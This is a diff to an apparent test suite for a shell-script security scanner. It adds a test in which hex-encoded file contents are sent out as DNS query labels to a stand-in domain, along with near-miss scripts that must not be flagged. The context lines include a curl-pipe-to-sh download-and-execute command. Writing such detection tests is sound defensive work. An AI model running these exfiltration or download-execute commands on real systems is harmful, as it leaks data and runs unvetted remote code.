@@ -184,6 +184,37 @@ describe("scan", () => {
     expect(result.findings.some((f) => f.ruleId === "chain.read-upload")).toBe(true);
   });
 
+  it("tracks encoded file content into DNS query labels", () => {
+    const result = scan(`
+      xxd -p /tmp/input.txt > /tmp/encoded.hex
+      for chunk in $(cat /tmp/encoded.hex); do
+        dig "$chunk.example.invalid"
+      done
+    `);
+    expect(result.findings).toEqual(expect.arrayContaining([
+      expect.objectContaining({
+        ruleId: "chain.dns-file-exfiltration",
+        category: "data_exfiltration",
+      }),
+    ]));
+
+    const hardNegatives = [
+      "xxd -p /tmp/input.txt > /tmp/encoded.hex",
+      'dig "health.example.invalid"',
+      `xxd -p /tmp/input.txt > /tmp/a.hex
+       for chunk in $(cat /tmp/b.hex); do dig "$chunk.example.invalid"; done`,
+      `xxd -p /tmp/input.txt > /tmp/a.hex
+       for chunk in $(cat /tmp/a.hex); do echo "$chunk.example.invalid"; done`,
+      `xxd -p /tmp/input.txt > /tmp/a.hex
+       for chunk in $(cat /tmp/a.hex); do dig "$chunk"; done`,
+    ];
+    for (const source of hardNegatives) {
+      expect(scan(source).findings.some((finding) =>
+        finding.ruleId === "chain.dns-file-exfiltration"
+      )).toBe(false);
+    }
+  });
+
   it("allows download-execute from an explicitly trusted exact host", () => {
     const result = scan("curl https://artifacts.corp.example/a.sh | sh", {
       allowedDownloadHosts: ["artifacts.corp.example"],
